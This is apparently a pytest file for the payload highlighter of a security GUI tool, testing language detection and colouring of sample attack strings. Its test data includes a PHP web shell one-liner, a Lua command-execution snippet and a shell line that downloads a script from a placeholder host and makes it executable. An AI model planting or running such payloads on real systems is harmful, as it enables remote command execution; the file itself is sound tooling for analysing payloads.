"""Подсветка payload'а: определение языка и форматы символов."""
import os

os.environ.setdefault("QT_QPA_PLATFORM", "offscreen")

import pytest

pytestmark = pytest.mark.gui


@pytest.fixture(scope="module")
def qapp():
    from PySide6.QtWidgets import QApplication
    app = QApplication.instance() or QApplication([])
    yield app


def test_detect_php():
    from paradox_gui.payload_highlighter import detect_language

    assert detect_language("<?php sys" "tem($_GET['c']); ?>") == "php"


def test_detect_lua():
    from paradox_gui.payload_highlighter import detect_language

    assert detect_language(
        'local h = io.popen("whoami")\nlocal r = h:read("*a")\n'
    ) == "lua"


def test_detect_shell():
    from paradox_gui.payload_highlighter import detect_language

    assert detect_language(
        "#!/bin/sh\nwget http://x/y.sh\nchmod +x y.sh"
    ) == "shell"


def test_unknown_text_is_generic():
    from paradox_gui.payload_highlighter import detect_language

    assert detect_language("GET /index.php HTTP/1.1") == "generic"


def test_highlighter_marks_tokens(qapp):
    from PySide6.QtGui import QTextDocument

    from paradox_gui.payload_highlighter import PayloadHighlighter

    document = QTextDocument()
    document.setPlainText("<?php sys" "tem($_GET['c']); ?>")
    highlighter = PayloadHighlighter(document)
    highlighter.set_language("php")
    highlighter.rehighlight()

    formats = document.firstBlock().layout().formats()
    assert formats
    colors = {f.format.foreground().color().name() for f in formats}
    # Красный сток и оранжевый источник должны присутствовать.
    from paradox_gui.theme import SEVERITY

    assert SEVERITY["critical"].lower() in colors
    assert SEVERITY["high"].lower() in colors
